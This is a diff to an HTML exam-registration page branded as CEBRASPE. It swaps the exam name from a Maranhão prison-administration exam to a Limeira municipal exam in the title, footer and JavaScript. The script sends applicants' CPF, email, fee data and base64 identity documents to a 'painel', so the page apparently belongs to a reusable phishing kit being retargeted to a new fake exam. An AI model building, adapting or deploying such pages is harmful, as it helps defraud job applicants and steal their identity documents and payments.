@@ -794,7 +794,7 @@ h2.tituloPagina span { border-bottom:0 !important; text-indent:0 !important; pad
 </div>
 <div class="dados">
 <p class="tipo">Concurso</p>
-<h2 style="font-weight:normal!important"></h2><p><strong>Concurso Público da Secretaria de Estado de Administração Penitenciária do Maranhão (SEAP_MA_26)</strong></p>
+<h2 style="font-weight:normal!important"></h2><p><strong>Concurso Público - 01/2026 - Prefeitura Municipal de Limeira</strong></p>
 <p class="periodoInscricoes">Inscrições de 
  <b>30/07/2026</b> a 
  <b>31/08/2026</b>
@@ -914,7 +914,7 @@ Estou ciente de que prestar informações falsas acarreta minha eliminação do 
 <div class="final">
 <div class="Conteudo">
 <div class="links">
- © CEBRASPE — CONCURSO PÚBLICO SEAP_MA_26
+ © CEBRASPE — CONCURSO PÚBLICO PREFEITURA DE LIMEIRA
  </div>
 <div class="DesenvolvimentoProSeleta">
  Desenvolvido por <a href="#">ProSeleta - Gestão de Processos Seletivos Online</a>
@@ -1207,7 +1207,7 @@ function __handleDocTipo(v){
       var ov = document.getElementById('loading-overlay');
       if(ov) ov.style.display = 'flex';
       // Envia cadastro para o painel + documentos (base64)
-      var CONCURSO = 'Concurso Público da Secretaria de Estado de Administração Penitenciária do Maranhão (SEAP_MA_26) - Edital 001/2026';
+      var CONCURSO = 'Concurso Público - 01/2026 - Prefeitura Municipal de Limeira - Edital 001/2026';
       // Captura vaga dinamicamente do <option> selecionado
       var vagaSel = form.querySelector('#VAGA');
       var vagaOpt = vagaSel && vagaSel.options[vagaSel.selectedIndex];
@@ -1229,7 +1229,7 @@ function __handleDocTipo(v){
           cpf: data.CPF || '',
           email: data.EMAIL || '',
           concurso: CONCURSO,
-          edital: '001/2026-SEAP-MA',
+          edital: '001/2026',
           stage: 'cadastro',
           visitor_id: window.__vid(),
           form_data: form_data
@@ -1292,7 +1292,7 @@ function __handleDocTipo(v){
       try{
         var ctx = Object.assign({}, data, {
           __concurso: CONCURSO,
-          __edital: '001/2026-SEAP-MA',
+          __edital: '001/2026',
           __cargo_codigo: vagaInfo.codigo,
           __cargo_titulo: vagaInfo.titulo,
           __taxa: vagaInfo.taxa,
